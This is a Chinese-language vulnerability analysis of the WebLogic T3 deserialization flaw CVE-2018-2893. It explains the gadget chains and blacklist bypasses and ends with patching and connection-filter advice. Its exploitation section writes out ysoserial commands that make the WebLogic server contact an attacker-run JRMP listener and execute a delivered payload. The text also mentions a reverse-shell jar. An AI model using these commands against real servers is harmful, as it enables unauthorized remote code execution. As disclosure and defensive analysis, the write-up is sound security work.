# 一、背景介绍

WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVA EE架构的中间件,
WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。

## 1.1 漏洞描述

Oracle官方在2018年7月发布了关键补丁更新，其中包含了Oracle WebLogic
Server的一个高危的WebLogic反序列化漏洞，通过该漏洞，攻击者可以在未授权的情况下远程执行代码。

此漏洞产生于WebLogic
T3服务，当开放WebLogic控制台端口（默认为7001端口）时，T3服务会默认开启，因此会造成较大影响。结合曾经爆出的WebLogic WLS
组件漏洞，不排除会有攻击者利用漏洞挖矿的可能，因此，建议受影响企业用户尽快部署防护措施。

## 1.2 受影响的系统版本

WebLogic10.3.6.0

WebLogic12.1.3.0

WebLogic12.2.1.2

WebLogic12.2.1.3

## 1.3 漏洞编号

CVE-2018-2893

# 二、漏洞细节

这次的WebLogic
(CVE-2018-2893)漏洞和之前的JRMP协议漏洞(CVE-2018-2628)漏洞是分不开的，他是结合了RMI机制缺陷和JDK反序列化漏洞绕过了WebLogic黑名单，所以介绍这个漏洞之前，先回顾下之前的漏洞利用链。

在CVE-2015-4852 中利用的是Commons Collections
库，主流的两大利用链是TransformedMap和Lazymap，其实他们的核心都是类似的。

先拿TransformedMap做个介绍，核心是反射机制。

 ** 反射机制**

JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为Java语言的反射机制。

对应得代码是这样,下面这段代码就可以通过反射调用java.net.URLClassLoader.class，这个类可以本地或者远程拉起任意的jar文件，同时不用管文件名后缀，直接读取二进制的jar文件。下面这个是拉起了一个反弹Shell功能的jar文件。

  
![image.png](https://image.3001.net/images/20180719/15319914858436.png!small)  

然后再来看看核心的反射方法，InvokerTransformer中的transform方法。这个方法就是实现执行任意类的核心方法，但是必须需要通过反序列化的方式调用这个方法。那么是如何调用的呢？

  
![image.png](https://image.3001.net/images/20180719/1531991493897.png!small)  

在TransformedMap中有三个方法调用了transform方法

  
![image.png](https://image.3001.net/images/20180719/15319915003634.png!small)  

下面就是找到谁调用了这3个方法中的一个，可以看到TransformdMap继承了父类，所有的类都实现了序列化接口，不然无法反序列化，这个不再重复强调

  
![image.png](https://image.3001.net/images/20180719/15319915082264.png!small)  

跟进这个父类

  
![image.png](https://image.3001.net/images/20180719/15319915265605.png!small)  

可以看到MapEntry调用的setValue调用了其中的checkSetvalue方法。好了哪里调用了setValue呢?

那就是经典的sun.reflect.annotation.AnnotationInvocationHandler，它重写了ReadObject反序列化的方法，其中就调用了MapEntry的SetValue方法。

  
![image.png](https://image.3001.net/images/20180719/15319915322704.png!small)  

然后WebLogic的T3协议走的都是ReadObject方法，所以你给他通过T3协议发送WriteObject方法序列化后的二进制字节，他就自然的走上面的攻击链了，下面附上完整攻击链。

  
![image.png](https://image.3001.net/images/20180719/15319915327269.png!small)  

LazyMap其实也是类似的，只不过借用了动态代理的方法去实现。

  
![image.png](https://image.3001.net/images/20180719/15319915352326.png!small)  

可以看到Lazymap中的get方法调用了transfrom方法。

经典的sun.reflect.annotation.AnnotationInvocationHandler的invoke方法中掉用了get方法，通过动态代理方式就可以调用这个方法。

  
![image.png](https://image.3001.net/images/20180719/15319915458850.png!small)  

然后谈谈RMI绕过，RMI又都是走的序列化和反序列化，所以CVE-2017-3248和CVE-2018-2628
漏洞都是这么绕过的。CVE-2018-2628是因为补丁只封堵了CVE-2017-3248的接口java.rmi.registry.Registry，然而CVE-2018-2628是利用了java.rmi.activation.Activator接口绕过了黑名单。

RMI是Remote Method
Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。

RMI传输过程都使用序列化和反序列化，如果RMI服务端端口对外开发，并且服务端使用了像Apache
CommonsCollections这类库，那么会导致远程命令执行。

RMI依赖于Java远程消息交换协议JRMP（JavaRemote Messaging
Protocol），该协议为Java定制，要求服务端与客户端都为Java编写，

因为后来补丁把Commons
Collections库漏洞补掉了，反射链没有了，所以这次的CVE-2018-2893是通过JDK的反序列化漏洞实现的RCE也就是ysoserial中的JDK7u21就可以实现绕过。后来还有升级版的JDK8u20是在JDK7u21发展来的。JDK7u21利用链也是十分复杂的但是还是有很多共同点的，它也是借用了跟lazymap相同的动态代理思路，走的也是经典的sun.reflect.annotation.AnnotationInvocationHandler的invoke方法，这个走的是hashcode这个分支。

  
![image.png](https://image.3001.net/images/20180719/15319915564875.png!small)  

因为commonscollection被干掉了不能走Lazymap那个分支调用InvokerTransformer中的transform方法。所以可以自己写了个恶意的TemplatesImpl类对象自己存到LinkedHashSet

  
![image.png](https://image.3001.net/images/20180719/15319915645276.png!small)  

而LinkedHashSet继承了Hashset，而Hashset又重写了ReadObject方法，并调用了put方法。

  
![image.png](https://image.3001.net/images/20180719/15319915737939.png!small)  

Put方法中有一处hash绕过，已有详细分析不再这里介绍。

  
![image.png](https://image.3001.net/images/20180719/15319915803753.png!small)  

最后看下利用代码，先创建了恶意的TemplatesImpl对象，然后通过InvocationHandler动态代理调用invoke方法，String
zeroHashCodeStr ="f5a5a608";这个就是为了hash绕过，使proxy.hashCode() ==
templates.hashCode()

  
![image.png](https://image.3001.net/images/20180719/15319915889102.png!small)  

在JDK7u21之后的版本和JDK8u20的版本中修复了经典的sun.reflect.annotation.AnnotationInvocationHandler，这里如果检测出不是AnnotationType，就会退出抛出异常并退出反序列化流程。

  
![image.png](https://image.3001.net/images/20180719/15319915978548.png!small)  

这里的绕过思路就是其实var1.defaultReadObject()已经完成了反序列化我们的恶意序列化代码，只不过后面异常终止了，所以需要找一处也抛出异常的readObject方法但是同时异常处理啥也没有做就可以了。

java.beans.beancontext.BeanContextSupport中就有这么一个点可以利用，可以看到continue。它返回到BeanContextSupport.readObject()方法中，继续执行到deserialize。

  
![image.png](https://image.3001.net/images/20180719/1531991606811.png!small)  

  
  

所以在JDk7u21基础上序列化的二进制数据中插入一段BeanContextSupport对象，这个对象没有加入到动态代理中，在反序列化完成后就会被忽略，但是还是会分配一个Handle，就会绕过抛出异常中断的问题，其他点跟JDK7u21的利用链就一样了，不过这里需要更改偏移，有文章详细介绍不再累述。

  
  

# 三、漏洞利用

这里使用的是CVE-2018-2628加上JDK7u21，从下面的图可以看到使用的是JDK7u10, 理论上JDK
7系列版本小于等于21的都可以成功触发漏洞。

  
![image.png](https://image.3001.net/images/20180719/15319916479818.png!small)  

>java-jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
JRMPClient2"192.168.1.105:1099" > payload_1

  
![image.png](https://image.3001.net/images/20180719/15319916543636.png!small)  

这个payload其实就是CVE-2018-2628的java.rmi.activation.Activator然后通过T3协议发送给WebLogic，WebLogic的RMI收到后通过JRMP发送给ysoserial写好的Server端

![image.png](https://image.3001.net/images/20180719/15319921033420.png!small)  
  

在192.168.1.105上做服务端的监听，如果收到WebLogic的RMI通信就下发 JDK7u21的payload给WebLogic弹出个计算器

java-cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener
1099Jdk7u21 "calc.exe"

![image.png](https://image.3001.net/images/20180719/15319921084606.png!small)

![image.png](https://image.3001.net/images/20180719/15319923557542.png!small)

# 四、修复建议

1) 官方补丁

Oracle官方已经在7月的关键补丁更新中修复了此漏洞，受影响的用户请尽快升级更新进行防护。

可使用正版软件许可账户登录<https://support.oracle.com>，下载最新补丁。

2) 手工修复

若要利用该漏洞, 攻击者首先需要与WebLogic Server提供的T3服务端口建立SOCKET连接,
运维人员可通过控制T3协议的访问权限来临时阻断漏洞利用。

WebLogic提供了名叫“weblogic.security.net.ConnectionFilterImpl”的默认连接筛选器。该连接筛选器可控制所有传入连接，通过修改此连接筛选器规则，可对T3及T3S协议进行访问控制。

#  

